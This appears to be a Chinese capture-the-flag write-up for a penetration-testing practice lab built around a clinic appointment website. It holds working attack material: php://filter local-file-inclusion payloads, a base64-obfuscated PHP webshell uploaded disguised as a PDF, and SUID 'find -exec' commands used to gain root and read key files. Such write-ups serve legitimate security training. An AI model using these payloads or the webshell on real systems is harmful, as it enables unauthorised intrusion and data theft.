# 梅奥医生
## 环境搭建

sstap，是用来连接socket5代理软件

添加s5代理

s5.huayunsys.com

60004-60009都可以

之后连接

目标
192.168.216.130

或

192.168.216.160
## 流程
进入网站，进入网站，拿 nmap 扫一遍端口

oioi 小鬼，好东西出来了

发现 21、80、3306、6721

拿到一个网站得先看根目录是啥吧

查看phpinfo

发现是/var/www/html/PIzABXDg/

![image](https://github.com/user-attachments/assets/a77af2a2-947d-4755-be5c-db819391f8c9)

再尝试一下最典的 index，跳到了登录界面

![image](https://github.com/user-attachments/assets/0846a3d5-4936-4a9c-92b8-badffb53391b)

然后好东西派上用场了，先来看 21 端口

ftp://192.168.216.128

发现ftp服务器里有个config.php

![image](https://github.com/user-attachments/assets/540a9c22-fbba-43f7-94eb-8acfc47f0da1)

明摆着告诉我要进数据库啊

简直 ez，打开 navicat 就是一顿操作

发现了 patient，小学四年级英语，一看就知道这玩意有用

又看到了 user，想都不用想直接点开，肯定大有用处

![image](https://github.com/user-attachments/assets/9f23a072-fc01-4c1e-af76-9d792c325f73)

如我所料，md5 改密码后回登录界面登陆

![image](https://github.com/user-attachments/assets/490fd5c8-e25d-4309-8278-3f825fac9744)

没意思，key6 就这么到手了

好戏接着上演，有个上传文件的地方，这不妥妥提示有文件上传漏洞吗？

但是只能传 pdf 文件，嗐，改个后缀不就行了

立马写个一句话木马，但是这玩意上传到哪里？还不知道

21 端口搞完了，再看看 6721

访问http://192.168.216.128:6721

发现发现 http://192.168.216.128:6721/api/query_pdf.php

需要POST参数为archive

上传漏洞有了，再来个不包含漏洞不过分吧？

顺藤摸瓜

先在 POST 来一个archive=php://filter/read=convert.base64-encode/resource=./query_pdf.php

解码之后得到

```
<meta charset="utf-8">
<?php
$archive = $_POST['archive'];
include($archive);

if(!isset($archive)){
	echo "<p>COVID-19ç´§æ¥æ¡£æ¡æ¥è¯¢API</p>";
	echo "<p>* è¯·æ±æ¹å¼ - POST *</p>";
	echo "<p>* è¯·æ±åæ° - archive *</p>";
}
?>
```
拿到一个网页总得看看源码吧，利用这个漏洞

archive=php://filter/read=convert.base64-encode/resource=/var/www/html/PIzABXDg/index.php
就能得到

```
<?php require('config.php');?>
<?php include('lib/functions.php');?>
<?php require('lib/mysql.class.php');?>
<?php
@extract($_GET,EXTR_PREFIX_ALL,"g");
if(isset($_POST['submit']) || isset($g_submit)){
  @check_post_request();
  @extract($_POST,EXTR_PREFIX_ALL,"p");
}

session_cache_limiter('private,must-revalidate');
if(!isset($_SESSION)){
  session_start();
}
$db = new c_mysql;
$g_m = (isset($g_m) && in_array_key($g_m,$config['model'])) ? $g_m : 'login';
$g_o = isset($g_o) ? $g_o : '';

if($g_m != 'login')
  if(!isset($_SESSION['uid'])){
    header('Location:?m=login');
	exit();
  }
  
if(isset($_SESSION['uid']) && $g_m != 'login'){
  $user = $db->select_one('user',array('id' => $_SESSION['uid']));
  if(!$user)
    alert_goto('?m=login','æ²¡æè¿ä¸ªç¨æ·çè®°å½ï¼è¯·éæ°ç»å½ï¼');
}

if($g_m == 'home'){
  $g_m = 'order';
  $g_o = 'list';
}

$exts = $db->select_date('ext');
foreach($exts as $ext)
  $config['ext'][$ext['id']] = $ext;
foreach($exts as $ext)
  $config['ext'][$ext['code']] = $ext;

$model_file = 'model/'.$g_m.'.php';
if(file_exists($model_file))
  include($model_file);

$operate_file = 'model/'.$g_m."_".$g_o.".php";
if(file_exists($operate_file))
  include($operate_file);

create_html();
?>
```
利用我们一流的代码审计能力，推断一定有一个文件/model/order_list.php

我们来看一下这里头有啥

archive=php://filter/read=convert.base64-encode/resource=/var/www/html/PIzABXDg/model/order_list.php
```
<?php
$operates['list'] = 'é¢çº¦åè¡¨';
$pagenum = empty($g_pagenum) ? 1 : $g_pagenum;
$pagesize = 20;
$limit = (($pagenum - 1) * $pagesize).','.$pagesize;
$orders = $db->select_date('order','','',$limit,'addtime');
if(!$orders)
  $order_list = "<tr><td colspan='7'>ä¸ä¸ªé¢çº¦ä¹æ¨æ~~~~(>_<)~~~~ </td></tr>";
else{
  $order_list = '';
  foreach($orders as $order){
	$orderoperate = "<a href=\"javascript:if(confirm('ç¡®å®å é¤è¯¥é¢çº¦ï¼')) top.location='?m=order&o=delete&id=".$order['id']."'\">å é¤é¢çº¦</a>";
    $order_list .= "<tr>";
    $order_list .= "  <td valign='top'>".$order['id']."</td>";
    $order_list .= "  <td valign='top'><p class=\"name\">".$order['name']."</p></td>";
    $order_list .= "  <td valign='top'>".date('Y-m-d H:i:s',$order['addtime'])."</td>";
    $order_list .= "  <td valign='top'><p class=\"subject\">".$order['subject']."</p></td>";
    $order_list .= "  <td valign='top'><p class=\"note\">".$order['note']."</p></td>";
    $order_list .= "  <td valign='top'>".$order['comedate']."</td>";
    $order_list .= "  <td valign='top'>".$orderoperate."</td>";
    $order_list .= "</tr>";
  }
	$num = get_num('order');
    $pagelinks = create_pagelinks('?m=order&o=list',$num,$pagenum,$pagesize);
    $order_list .= "<tr><td colspan='7'><div class=\"pagelinks\">".$pagelinks."</div></td></tr>";
}


$main_tpl = "order_list.htm";
$replace['order_list'] = $order_list;
?>
```
结果一点有用的都没有，出题人让我们浪费时间的水平真是一流

既然这没用的话，我们好像还有一个上传文件界面的源码没看

archive=php://filter/read=convert.base64-encode/resource=/var/www/html/PIzABXDg/model/order_upload.php

```
<?php
$operates['upload'] = 'ä¸ä¼ æ¡£æ¡';
$target_dir = "CISP-PTE-1413/";
$info = '';

if(isset($_POST["submit"])){
	$target_file = $target_dir . basename($_FILES[fileToUpload]["name"]);
$uploadOK = 1;
$fileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
if(file_exists($target_file)){
	$info="æä»¶å·²ç»å­å¨";
	$uploadOK = 0;
}
if($fileType != "pdf"){
	$info = "åªåä¸ä¼ PDFæä»¶";
	$uploadOK = 0;
}
if($fileType != "pdf"){
	$info = "åªåè®¸ä¸ä¼ pdfæä»¶";
	$uploadOK = 0;
}
if($uploadOK == 0){
}else{
	if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)){
		$info = basename($_FILES["fileToUpload"]["name"])."ä¸ä¼ æå";
	}else{
		$info = "ä¸ä¼ æä»¶æ¶åçéè¯¯";
	}
}
}
$main_tpl = "order_upload.htm";
$replace['{info}'] = $info;
?>
```
okok，有东西了，发现上传地址为

CISP-PTE-1413/

访问一下http://192.168.216.128/CISP-PTE-1413/

![image](https://github.com/user-attachments/assets/858d1f0b-1656-4e14-8aab-0cc574a9ea92)

果然，已经看到我上传的文件了

但是刚刚写的一句话木马太鸡肋了，考虑到后面可能要用蚁剑，于是写一个它最喜欢的
```
<?php
$ant = base64_decode("YXNzZXJ0");
$ant($_POST['ant']);
?>
```
打开蚁剑

url地址http://192.168.216.128:6721/api/query_pdf.php

密码是设置好的 ant

编码器base64

请求信息，http body中

name是archive

value是/var/www/html/PIzABXDg/CISP-PTE-1413/zym.pdf

![image](https://github.com/user-attachments/assets/f3124e7f-f4b7-432b-9d52-5d7a2fc97b3b)

key7 就直接出来了

然后呢怎么做？既然都进蚁剑了，这不得再摸索摸索，玩着玩着就发现有一个模拟终端，这不又是一个好东西吗，拿来玩玩

发现是个 linux 系统，那得先提权吧

find / -perm -u=s -type f 2>/dev/null，提到 root

/usr/bin/find query_pdf.php -exec whoami \;  确定了我的确是 root

/usr/bin/find query_pdf.php -exec ls /root \;   看看有些啥文件

发现目标 key8.php

/usr/bin/find query_pdf.php -exec cat /root/key8.php \; 

![image](https://github.com/user-attachments/assets/ad969f16-22c0-43b0-bb5d-4aed49f03ef5)

拿下拿下
